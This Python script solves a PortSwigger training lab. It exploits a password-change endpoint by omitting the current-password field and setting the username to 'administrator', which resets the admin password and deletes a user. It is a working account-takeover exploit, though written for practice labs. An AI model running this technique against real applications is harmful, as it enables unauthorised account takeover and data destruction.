# Lab 07 — Weak isolation on dual-use endpoint
# PortSwigger: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint
#
# Vulnerability: The password-change endpoint accepts a client-controlled
#                'username' parameter, AND omitting 'current-password'
#                entirely (rather than leaving it empty) bypasses the
#                current-password check
# Aim:           Reset administrator's password and delete carlos
#
# Technique:
#   POST /my-account/change-password with:
#     - current-password parameter REMOVED entirely (not emptied)
#     - username set to 'administrator' instead of your own account
#   → password changed with no verification at all, for ANY account
#
# Usage: python business_logic_lab07.py <url>

import sys
import urllib3
from proxies import proxies
from business_logic_utils import banner, section, make_session, login, get_csrf_from_response, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NEW_ADMIN_PASSWORD = "hacked123"

if __name__ == "__main__":
    banner()
    section("LAB 07 — WEAK ISOLATION ON DUAL-USE ENDPOINT")

    if len(sys.argv) != 2:
        print("  Usage: python business_logic_lab07.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm wrong current-password is rejected ──────────────────
    print("\n  ── Step 1: confirm a WRONG current-password is rejected\n")
    account_page = session.get(f"{url}/my-account")
    csrf = get_csrf_from_response(account_page.text)

    data_wrong = {
        "username": "wiener",
        "current-password": "definitelywrong",
        "new-password-1": "test1234",
        "new-password-2": "test1234",
    }
    if csrf:
        data_wrong["csrf"] = csrf

    r_wrong = session.post(f"{url}/my-account/change-password", data=data_wrong, allow_redirects=True)
    print(f"  ℹ  Status: {r_wrong.status_code}")
    if "incorrect" in r_wrong.text.lower():
        print("  ✔  Wrong current-password correctly rejected\n")

    # ── Step 2: confirm OMITTING current-password bypasses the check ────────
    print("  ── Step 2: omit current-password ENTIRELY — expect bypass\n")
    account_page2 = session.get(f"{url}/my-account")
    csrf2 = get_csrf_from_response(account_page2.text)

    data_omitted = {
        "username": "administrator",     # ← target ANY account via this field
        "new-password-1": NEW_ADMIN_PASSWORD,
        "new-password-2": NEW_ADMIN_PASSWORD,
        # current-password intentionally NOT included at all
    }
    if csrf2:
        data_omitted["csrf"] = csrf2

    r_bypass = session.post(f"{url}/my-account/change-password", data=data_omitted, allow_redirects=True)
    check_status(r_bypass, [200, 302], "Password change with current-password omitted")
    print_box("Response (truncated)", r_bypass.text[:300])

    # ── Step 3: log in as administrator ───────────────────────────────────────
    print(f"\n  ── Step 3: log in as administrator with password '{NEW_ADMIN_PASSWORD}'\n")
    admin_session = make_session(proxies)
    if not login(admin_session, url, username="administrator", password=NEW_ADMIN_PASSWORD):
        print("  ✘  Login failed — the bypass may not have worked as expected")
        print("     on this lab instance. Double-check the request body shape")
        print("     in Burp (some instances may name fields slightly differently).")
        sys.exit(1)

    # ── Step 4: delete carlos ────────────────────────────────────────────────
    print("\n  ── Step 4: delete carlos via the admin panel\n")
    r_delete = admin_session.post(f"{url}/admin/delete", data={"username": "carlos"})
    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  Two flaws combined: (1) an ABSENT parameter behaves")
    print("     differently than an EMPTY one, and (2) 'username' being")
    print("     client-controlled turns a self-service feature into a")
    print("     universal password reset for any account.")
